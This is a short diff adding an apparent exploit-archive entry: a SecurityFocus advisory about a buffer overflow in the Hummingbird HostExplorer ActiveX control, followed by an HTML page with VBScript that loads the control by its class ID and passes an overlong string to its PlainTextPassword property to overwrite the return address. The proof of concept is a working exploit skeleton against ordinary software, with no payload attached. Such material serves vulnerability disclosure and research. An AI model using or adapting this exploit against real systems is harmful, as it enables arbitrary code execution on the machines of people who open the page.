@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/31783/info
+
+Hummingbird HostExplorer ActiveX control is prone to a buffer-overflow vulnerability because the application fails to adequately check boundaries on user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions. 
+
+<html> <!-- the latest version of this activex (13.0) is compiled with /gs, earlier versions aren't. The XXXX would have overwritten return address. by thomas.pollet@gmail.com --> <object classid='clsid:FFB6CC68-702D-4FE2-A8E7-4DE23835F0D2' id='target' ></object> <script language='vbscript'> arg1="001101220123012401250126012701280129012:012;012<012=012>012?012@012A012B012C012D012E012FXXXX" target.PlainTextPassword = arg1 </script> </html> 
